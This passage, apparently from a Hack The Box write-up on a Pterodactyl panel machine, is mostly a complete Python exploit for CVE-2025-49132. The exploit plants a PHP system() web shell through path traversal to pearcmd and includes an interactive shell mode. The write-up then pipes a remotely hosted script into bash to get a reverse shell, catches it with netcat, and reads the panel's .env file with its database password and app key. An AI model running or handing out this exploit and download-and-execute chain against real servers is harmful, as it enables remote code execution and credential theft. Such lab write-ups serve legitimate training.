class="line">    </span><br><span class="line">    # If we found specific patterns, return them</span><br><span class="line">    if results:</span><br><span class="line">        return &#x27;\n&#x27;.join(results)</span><br><span class="line">    </span><br><span class="line">    # Otherwise try regex extraction</span><br><span class="line">    patterns = [</span><br><span class="line">        r&#x27;(uid=\d+\([^)]+\)[^\n&lt;]+)&#x27;,  # uid output</span><br><span class="line">        r&#x27;(HTB\&#123;[^&#125;]+\&#125;)&#x27;,  # HTB flags</span><br><span class="line">        r&#x27;(root:[^:]+:[^:]+:[^:]+:[^:]+:[^:]+:[^\n]+)&#x27;,  # /etc/passwd format</span><br><span class="line">        r&#x27;(total\s+\d+.*)&#x27;,  # ls output</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for pattern in patterns:</span><br><span class="line">        match = re.search(pattern, raw_output, re.MULTILINE)</span><br><span class="line">        if match:</span><br><span class="line">            return match.group(1)</span><br><span class="line">    </span><br><span class="line">    # If nothing found, check if there&#x27;s any non-JSON output</span><br><span class="line">    if not raw_output.strip().startswith(&#x27;&#123;&#x27;):</span><br><span class="line">        # Return first 500 chars of output</span><br><span class="line">        return raw_output[:500].strip()</span><br><span class="line">    </span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def exploit(host, command, pear_path=&quot;../../../../../../usr/share/php/PEAR&quot;, port=None, verbose=False):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Execute the PEAR exploit</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # Escape spaces in command</span><br><span class="line">    payload = command.replace(&#x27; &#x27;, &#x27;\\$\\&#123;IFS\\&#125;&#x27;)</span><br><span class="line">    </span><br><span class="line">    # Build URL with optional port</span><br><span class="line">    base_url = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; if port else f&quot;http://&#123;host&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    print_info(f&quot;Target: &#123;base_url&#125;&quot;)</span><br><span class="line">    print_info(f&quot;PEAR Path: &#123;pear_path&#125;&quot;)</span><br><span class="line">    print_info(f&quot;Command: &#123;command&#125;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    # Step 1: Write payload</span><br><span class="line">    print_info(&quot;Writing payload to /tmp/shell.php...&quot;)</span><br><span class="line">    write_url = (</span><br><span class="line">        f&#x27;&#123;base_url&#125;/locales/locale.json?&#x27;</span><br><span class="line">        f&#x27;+config-create+/&amp;&#x27;</span><br><span class="line">        f&#x27;locale=&#123;pear_path&#125;&amp;&#x27;</span><br><span class="line">        f&#x27;namespace=pearcmd&amp;&#x27;</span><br><span class="line">        f&#x27;/&lt;?=system(\&#x27;&#123;payload&#125;\&#x27;)?&gt;+/tmp/shell.php&#x27;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    if verbose:</span><br><span class="line">        print(f&quot;Write URL: &#123;write_url&#125;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    write_cmd = f&#x27;curl -s &quot;&#123;write_url&#125;&quot;&#x27;</span><br><span class="line">    write_result = subprocess.run(write_cmd, shell=True, capture_output=True, text=True)</span><br><span class="line">    </span><br><span class="line">    if verbose:</span><br><span class="line">        print(f&quot;Write response: &#123;write_result.stdout[:200]&#125;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    print_success(&quot;Payload written&quot;)</span><br><span class="line">    </span><br><span class="line">    # Step 2: Execute payload</span><br><span class="line">    print_info(&quot;Executing payload...&quot;)</span><br><span class="line">    exec_url = f&#x27;&#123;base_url&#125;/locales/locale.json?locale=../../../../../tmp&amp;namespace=shell&#x27;</span><br><span class="line">    </span><br><span class="line">    if verbose:</span><br><span class="line">        print(f&quot;Exec URL: &#123;exec_url&#125;\n&quot;)</span><br><span class="line">    </span><br><span class="line">    exec_cmd = f&#x27;curl -s &quot;&#123;exec_url&#125;&quot;&#x27;</span><br><span class="line">    exec_result = subprocess.run(exec_cmd, shell=True, capture_output=True, text=True)</span><br><span class="line">    </span><br><span class="line">    # Clean and display output</span><br><span class="line">    output = clean_output(exec_result.stdout)</span><br><span class="line">    </span><br><span class="line">    if output:</span><br><span class="line">        print_success(&quot;Command executed successfully!\n&quot;)</span><br><span class="line">        print(f&quot;&#123;Colors.BOLD&#125;&#123;&#x27;=&#x27;*60&#125;&quot;)</span><br><span class="line">        print(&quot;OUTPUT:&quot;)</span><br><span class="line">        print(f&quot;&#123;&#x27;=&#x27;*60&#125;&#123;Colors.END&#125;&quot;)</span><br><span class="line">        print(output)</span><br><span class="line">        print(f&quot;&#123;Colors.BOLD&#125;&#123;&#x27;=&#x27;*60&#125;&#123;Colors.END&#125;&quot;)</span><br><span class="line">        return True, output</span><br><span class="line">    else:</span><br><span class="line">        print_error(&quot;No output received or command failed&quot;)</span><br><span class="line">        if verbose:</span><br><span class="line">            print(f&quot;\nRaw response:\n&#123;exec_result.stdout[:500]&#125;&quot;)</span><br><span class="line">        return False, None</span><br><span class="line"></span><br><span class="line">def interactive_shell(host, pear_path, port=None):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Provide an interactive shell</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    print_success(&quot;Entering interactive shell mode&quot;)</span><br><span class="line">    print_info(&quot;Type &#x27;exit&#x27; or &#x27;quit&#x27; to leave\n&quot;)</span><br><span class="line">    </span><br><span class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            command = input(f&quot;&#123;Colors.GREEN&#125;shell&gt;&#123;Colors.END&#125; &quot;).strip()</span><br><span class="line">            </span><br><span class="line">            if command.lower() in [&#x27;exit&#x27;, &#x27;quit&#x27;, &#x27;q&#x27;]:</span><br><span class="line">                print_info(&quot;Exiting shell&quot;)</span><br><span class="line">                break</span><br><span class="line">            </span><br><span class="line">            if not command:</span><br><span class="line">                continue</span><br><span class="line">            </span><br><span class="line">            # Execute command</span><br><span class="line">            success, output = exploit(host, command, pear_path, port, verbose=False)</span><br><span class="line">            </span><br><span class="line">            if not success:</span><br><span class="line">                print_error(&quot;Command execution failed&quot;)</span><br><span class="line">            </span><br><span class="line">            print()  # Empty line for readability</span><br><span class="line">            </span><br><span class="line">        except KeyboardInterrupt:</span><br><span class="line">            print(&quot;\n&quot;)</span><br><span class="line">            print_info(&quot;Exiting shell&quot;)</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print_error(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">def find_pear_path(host, port=None):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Try to find the correct PEAR path</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    print_info(&quot;Searching for PEAR installation...\n&quot;)</span><br><span class="line">    </span><br><span class="line">    base_url = f&quot;http://&#123;host&#125;:&#123;port&#125;&quot; if port else f&quot;http://&#123;host&#125;&quot;</span><br><span class="line">    </span><br><span class="line">    pear_paths = [</span><br><span class="line">        (&quot;../../../../../../usr/share/php/PEAR&quot;, &quot;Debian/Ubuntu (php-pear package)&quot;),</span><br><span class="line">        (&quot;../../../../../../usr/lib/php8/PEAR&quot;, &quot;PHP 8 (Alpine/custom)&quot;),</span><br><span class="line">        (&quot;../../../../../../usr/share/pear&quot;, &quot;Alternative Debian/Ubuntu&quot;),</span><br><span class="line">        (&quot;../../../../../../usr/local/lib/php/PEAR&quot;, &quot;Custom PHP install&quot;),</span><br><span class="line">        (&quot;../../../../../../opt/php/lib/php/PEAR&quot;, &quot;Optional PHP install&quot;),</span><br><span class="line">        (&quot;../../../../../usr/share/php/PEAR&quot;, &quot;Shallower web root (depth 5)&quot;),</span><br><span class="line">        (&quot;../../../../../../../usr/share/php/PEAR&quot;, &quot;Deeper web root (depth 7)&quot;),</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for pear_path, description in pear_paths:</span><br><span class="line">        url = f&#x27;&#123;base_url&#125;/locales/locale.json?locale=&#123;pear_path&#125;&#x27;</span><br><span class="line">        cmd = f&#x27;curl -s &quot;&#123;url&#125;&quot;&#x27;</span><br><span class="line">        </span><br><span class="line">        print(f&quot;Testing: &#123;description&#125;&quot;)</span><br><span class="line">        print(f&quot;  Path: &#123;pear_path&#125;&quot;)</span><br><span class="line">        </span><br><span class="line">        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)</span><br><span class="line">        </span><br><span class="line">        # Check if PEAR-related content is found</span><br><span class="line">        if any(keyword in result.stdout.lower() for keyword in [&#x27;pear&#x27;, &#x27;pearcmd&#x27;, &#x27;system.php&#x27;, &#x27;config&#x27;]):</span><br><span class="line">            print_success(f&quot;Found PEAR at: &#123;pear_path&#125;\n&quot;)</span><br><span class="line">            return pear_path</span><br><span class="line">        </span><br><span class="line">        print_error(&quot;Not found&quot;)</span><br><span class="line">        print()</span><br><span class="line">    </span><br><span class="line">    print_error(&quot;PEAR not found in common locations&quot;)</span><br><span class="line">    print_info(&quot;You may need to specify the path manually with --pear-path&quot;)</span><br><span class="line">    return None</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=&#x27;CVE-2025-49132 PEAR Exploit (Optimized)&#x27;,</span><br><span class="line">        formatter_class=argparse.RawDescriptionHelpFormatter,</span><br><span class="line">        epilog=&#x27;&#x27;&#x27;</span><br><span class="line">Examples:</span><br><span class="line">  # Execute single command</span><br><span class="line">  python3 exploit.py --host panel.pterodactyl.htb --command &quot;id&quot;</span><br><span class="line">  </span><br><span class="line">  # With custom PEAR path and port</span><br><span class="line">  python3 exploit.py --host 192.168.1.100 --port 8080 --command &quot;whoami&quot; --pear-path &quot;../../../../../../usr/lib/php8/PEAR&quot;</span><br><span class="line">  </span><br><span class="line">  # Interactive shell</span><br><span class="line">  python3 exploit.py --host panel.pterodactyl.htb --interactive</span><br><span class="line">  </span><br><span class="line">  # Find PEAR path</span><br><span class="line">  python3 exploit.py --host panel.pterodactyl.htb --find-pear</span><br><span class="line">  </span><br><span class="line">  # Verbose mode</span><br><span class="line">  python3 exploit.py --host panel.pterodactyl.htb --command &quot;ls -la&quot; -v</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">    )</span><br><span class="line">    </span><br><span class="line">    parser.add_argument(&#x27;--host&#x27;, required=True, help=&#x27;Target hostname or IP&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--port&#x27;, type=int, help=&#x27;Target port (default: 80)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--command&#x27;, &#x27;-c&#x27;, help=&#x27;Command to execute&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--pear-path&#x27;, default=&#x27;../../../../../../usr/share/php/PEAR&#x27;, </span><br><span class="line">                        help=&#x27;Path to PEAR (default: ../../../../../../usr/share/php/PEAR)&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--interactive&#x27;, &#x27;-i&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Interactive shell mode&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--find-pear&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Search for PEAR path&#x27;)</span><br><span class="line">    parser.add_argument(&#x27;--verbose&#x27;, &#x27;-v&#x27;, action=&#x27;store_true&#x27;, help=&#x27;Verbose output&#x27;)</span><br><span class="line">    </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&quot;&quot;</span><br><span class="line">&#123;Colors.BOLD&#125;╔═══════════════════════════════════════════════════════════╗</span><br><span class="line">║           CVE-2025-49132 PEAR RCE Exploit                ║</span><br><span class="line">║           Target: &#123;args.host:43s&#125; ║</span><br><span class="line">╚═══════════════════════════════════════════════════════════╝&#123;Colors.END&#125;</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line">    </span><br><span class="line">    # Find PEAR path mode</span><br><span class="line">    if args.find_pear:</span><br><span class="line">        found_path = find_pear_path(args.host, args.port)</span><br><span class="line">        if found_path:</span><br><span class="line">            print_success(f&quot;Use this path: --pear-path \&quot;&#123;found_path&#125;\&quot;&quot;)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    # Interactive mode</span><br><span class="line">    if args.interactive:</span><br><span class="line">        interactive_shell(args.host, args.pear_path, args.port)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    # Single command mode</span><br><span class="line">    if not args.command:</span><br><span class="line">        print_error(&quot;Please specify --command or use --interactive mode&quot;)</span><br><span class="line">        parser.print_help()</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    exploit(args.host, args.command, args.pear_path, args.port, args.verbose)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>Hosting a quick <code>shell.sh</code> reverse shell payload locally and feeding it into the exploit in interactive mode:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ python3 exploit.py --host panel.pterodactyl.htb --interactive</span><br><span class="line"></span><br><span class="line">╔═══════════════════════════════════════════════════════════╗</span><br><span class="line">║           CVE-2025-49132 PEAR RCE Exploit                ║</span><br><span class="line">║           Target: panel.pterodactyl.htb                       ║</span><br><span class="line">╚═══════════════════════════════════════════════════════════╝</span><br><span class="line"></span><br><span class="line">[+] Entering interactive shell mode</span><br><span class="line">[*] Type &#x27;exit&#x27; or &#x27;quit&#x27; to leave</span><br><span class="line"></span><br><span class="line">shell&gt; curl http://10.10.16.4/shell.sh | bash</span><br><span class="line">[*] Target: http://panel.pterodactyl.htb</span><br><span class="line">[*] PEAR Path: ../../../../../../usr/share/php/PEAR</span><br><span class="line">[*] Command: curl http://10.10.16.4/shell.sh | bash</span><br><span class="line"></span><br><span class="line">[*] Writing payload to /tmp/shell.php...</span><br><span class="line">[+] Payload written</span><br><span class="line">[*] Executing payload...</span><br></pre></td></tr></table></figure></div>
+
+<p>And we catch a callback as the <code>wwwrun</code> user:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 9001     </span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.4] from (UNKNOWN) [10.129.246.68] 48166</span><br><span class="line">sh: cannot set terminal process group (1211): Inappropriate ioctl for device</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-4.4$ id</span><br><span class="line">id</span><br><span class="line">uid=474(wwwrun) gid=477(www) groups=477(www)</span><br><span class="line">sh-4.4$ </span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Pivoting-through-the-Panel-database"><a href="#Pivoting-through-the-Panel-database" class="headerlink" title="Pivoting through the Panel database"></a>Pivoting through the Panel database</h2><p>We landed inside the panel’s <code>database/Factories</code> directory. Most files here are uninteresting Laravel factories (including a <code>UserSSHKeyFactory.php</code> full of <em>fake</em> test keys, don’t waste time on them):</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/pterodactyl/database/Factories</span><br><span class="line">sh-4.4$ ls</span><br><span class="line">ls</span><br><span class="line">AllocationFactory.php</span><br><span class="line">ApiKeyFactory.php</span><br><span class="line">BackupFactory.php</span><br><span class="line">DatabaseFactory.php</span><br><span class="line">DatabaseHostFactory.php</span><br><span class="line">EggFactory.php</span><br><span class="line">EggVariableFactory.php</span><br><span class="line">LocationFactory.php</span><br><span class="line">NestFactory.php</span><br><span class="line">NodeFactory.php</span><br><span class="line">ScheduleFactory.php</span><br><span class="line">ServerFactory.php</span><br><span class="line">SubuserFactory.php</span><br><span class="line">TaskFactory.php</span><br><span class="line">UserFactory.php</span><br><span class="line">UserSSHKeyFactory.php</span><br><span class="line">sh-4.4$ cat UserSSHKeyFactory.php</span><br><span class="line">cat UserSSHKeyFactory.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Database\Factories;</span><br><span class="line"></span><br><span class="line">use phpseclib3\Crypt\PublicKeyLoader;</span><br><span class="line">use Illuminate\Database\Eloquent\Factories\Factory;</span><br><span class="line"></span><br><span class="line">class UserSSHKeyFactory extends Factory</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * Some fake public keys generated for test purposes.</span><br><span class="line">     *</span><br><span class="line">     * @var string[]</span><br><span class="line">     */</span><br><span class="line">    protected static array $keys = [</span><br><span class="line">        &#x27;dsa&#x27; =&gt; &#x27;ssh-dss AAAAB3NzaC1kc3MAAACBAPfiWwEFvBOafdUmHDPjXsUttt+65FHSZSCVVeEFOTaL7Y3d0CJyrtck8KS1vmXHSb8QFBY2B1yVSb/reaQvNreWZN3KDYfLbF57/zimBn+IrHrJR+ZglhOxDRHoGPWK7q9jYIrOLwoOjkNKXxz1eOHKUgufFfSNtIRLycEXczLrAAAAFQC6LnBErezotG52jN4JostfC/TfEwAAAIACuTxRzYFDXHAxFICeqqY9w+y+v2yQfdeQ1BgCq2GMagUYfOdqnjizTO9M614r/nXZK1SV10TqhUcQtkJzDQIUtBqzBF5cIC/1cIFKzXi5rNHs8Y4bz/PBD+EbQJdiy+1so1oi790r710bqnkzTravAOJ5rGyfuQRLt+f+kuS9NAAAAIEA7tjGtJuXGUtPIXfnrMYS1iOWryO4irqnvaWfel002/DaGaNjRghNe/cUBYlAsjPhGJ1F7BQlLAY1koliTY6l0svs7ZPBM5QOumrr8OaNXGGVIq/RkkxuZHmRoUL2qH3DGYaktPUn4vFPliiAmGWOHAEu1K6B4g4vG/SKgMRpIvc=&#x27;,</span><br><span class="line">        &#x27;rsa_2048&#x27; =&gt; &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC4VVsHFO5MxvCtAPyoKGANWyuwZ4fvllvFog5RJbfpDpw8etDFVGEXl+uRR8p79g9oV7MscoFo6HiWrJc4/4vlP665msjosILdIcbnuzMhvXnKisaGh9zflkpyR3KhUxoHxqYp2q8XtffjKKAHz1a8o7OUG6fwaKIqu+d0PoICZQ==&#x27;,</span><br><span class="line">        &#x27;rsa_4096&#x27; =&gt; &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCo/YLm2SPSlOIG7AagBSmEe5c0b2PLPzUGFp3gARhD6n6ydBS40TlWzeg2qV95lh6fWBd8LsNgPOFmmuKuNZdBjAGeTY4gxKfHY1vK5/zOI4jPPqAMcCMNfd82aM97kx6dO8Hw1R79OyVpOZylpXLHayVPGHUK37Tpih4W7TeVSMrOqQF9F72lzhwgEtkdjm4gLBL6RpdNXrdnjIaNVnuade0Sb3w384vecZPe+S/997WirOMNy2JU4NdMHEnSjd1/i463RpN96AsXFAu1zl9nrXVhA7DVfSHoigXAqbs/xav8PRpLgAKjYpPohxQ9Nu6tP5jRUhfWdYwNFFp/aWloD/0JdP9LqcBBc9sO9TLkz3fBiUf11VM/QT1UhO84G+ahMxVn95jA472VPUe8uKff69lzbvSavEE6qcQX2TzVKOSi1E26Fzc6IZ/tHEuGEbGFxTsiQ1GysVZ0wr1p6ftd1SVqH5F/oaEK7UO8+xn/syEqaPf6A0eJWRNc0+lHA1sIRjmo9MOBvbkKExkx5JLHgGG81DYDFdZUuHY1BgSxJJcmNWV5BKRm350EbgRngoYI5tB3tCiZVW1PI8qyff9mBae11LY5GPlUeDnPrMvSdCKMIWrg7nC8SbndBCO3Fx4z7G2dTQy4ZmY7Ae9jR4pyg7tTOI3qgl8Z462GZi/jzw==&#x27;,</span><br><span class="line">        &#x27;ed25519&#x27; =&gt; &#x27;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaXIq09NH4a93EVdrvHYiZ67Wj+GBEBQ9ou4W0qSYm2&#x27;,</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Returns a fake public key for use on the system.</span><br><span class="line">     *</span><br><span class="line">     * @return array</span><br><span class="line">     */</span><br><span class="line">    public function definition()</span><br><span class="line">    &#123;</span><br><span class="line">        $key = PublicKeyLoader::loadPublicKey(static::$keys[&#x27;ed25519&#x27;]);</span><br><span class="line"></span><br><span class="line">        return [</span><br><span class="line">            &#x27;name&#x27; =&gt; $this-&gt;faker-&gt;name(),</span><br><span class="line">            &#x27;public_key&#x27; =&gt; $key-&gt;toString(&#x27;PKCS8&#x27;),</span><br><span class="line">            &#x27;fingerprint&#x27; =&gt; $key-&gt;getFingerprint(&#x27;sha256&#x27;),</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Returns a DSA public key.</span><br><span class="line">     */</span><br><span class="line">    public function dsa(): self</span><br><span class="line">    &#123;</span><br><span class="line">        $key = PublicKeyLoader::loadPublicKey(static::$keys[&#x27;dsa&#x27;]);</span><br><span class="line"></span><br><span class="line">        return $this-&gt;state([</span><br><span class="line">            &#x27;public_key&#x27; =&gt; $key-&gt;toString(&#x27;PKCS8&#x27;),</span><br><span class="line">            &#x27;fingerprint&#x27; =&gt; $key-&gt;getFingerprint(&#x27;sha256&#x27;),</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Returns an RSA public key, if &quot;weak&quot; is specified a 1024-bit RSA key is returned</span><br><span class="line">     * which should fail validation when being stored.</span><br><span class="line">     */</span><br><span class="line">    public function rsa(bool $weak = false): self</span><br><span class="line">    &#123;</span><br><span class="line">        $key = PublicKeyLoader::loadPublicKey(static::$keys[$weak ? &#x27;rsa_2048&#x27; : &#x27;rsa_4096&#x27;]);</span><br><span class="line"></span><br><span class="line">        return $this-&gt;state([</span><br><span class="line">            &#x27;public_key&#x27; =&gt; $key-&gt;toString(&#x27;PKCS8&#x27;),</span><br><span class="line">            &#x27;fingerprint&#x27; =&gt; $key-&gt;getFingerprint(&#x27;sha256&#x27;),</span><br><span class="line">        ]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">sh-4.4$ </span><br></pre></td></tr></table></figure></div>
+
+<p>Pterodactyl is a Laravel app, so the database creds live in <code>/var/www/pterodactyl/.env</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">sh-4.4$ cat /var/www/pterodactyl/.env</span><br><span class="line">cat /var/www/pterodactyl/.env</span><br><span class="line">APP_ENV=production</span><br><span class="line">APP_DEBUG=false</span><br><span class="line">APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=</span><br><span class="line">APP_THEME=pterodactyl</span><br><span class="line">APP_TIMEZONE=UTC</span><br><span class="line">APP_URL=&quot;http://panel.pterodactyl.htb&quot;</span><br><span class="line">APP_LOCALE=en</span><br><span class="line">APP_ENVIRONMENT_ONLY=false</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=daily</span><br><span class="line">LOG_DEPRECATIONS_CHANNEL=null</span><br><span class="line">LOG_LEVEL=debug</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=panel</span><br><span class="line">DB_USERNAME=pterodactyl</span><br><span class="line">DB_PASSWORD=PteraPanel</span><br><span class="line"></span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">CACHE_DRIVER=redis</span><br><span class="line">QUEUE_CONNECTION=redis</span><br><span class="line">SESSION_DRIVER=redis</span><br><span class="line"></span><br><span class="line">HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK</span><br><span class="line">HASHIDS_LENGTH=8</span><br><span class="line"></span><br><span class="line">MAIL_MAILER=smtp</span><br><span class="line">MAIL_HOST=smtp.example.com</span><br><span class="line">MAIL_PORT=25</span><br><span class="line">MAIL_USERNAME=</span><br><span class="line">MAIL_PASSWORD=</span><br><span class="line">MAIL_ENCRYPTION=tls</span><br><span class="line">MAIL_FROM_ADDRESS=no-reply@example.com</span><br><span class="line">MAIL_FROM_NAME=&quot;Pterodactyl Panel&quot;</span><br><span class="line"># You should set this to your domain to prevent it defaulting to &#x27;localhost&#x27;, causing</span><br><span class="line"># mail servers such as Gmail to reject your mail.</span><br><span class="line">#</span><br><span class="line"># @see: https://github.com/pterodactyl/panel/pull/3110</span><br><span class="line"># MAIL_EHLO_DOMAIN=panel.example.com</span><br><span class="line"></span><br><span class="line">APP_SERVICE_AUTHOR=&quot;pterodactyl@pterodactyl.htb&quot;</span><br><span class="line">PTERODACTYL_TELEMETRY_ENABLED=false</span><br><span class="line">RECAPTCHA_ENABLED=false</span><br><span class="line">sh-4.4$ </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><code>pterodactyl:PteraPanel</code> on the <code>panel</code> MariaDB database. Let’s list the tables:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 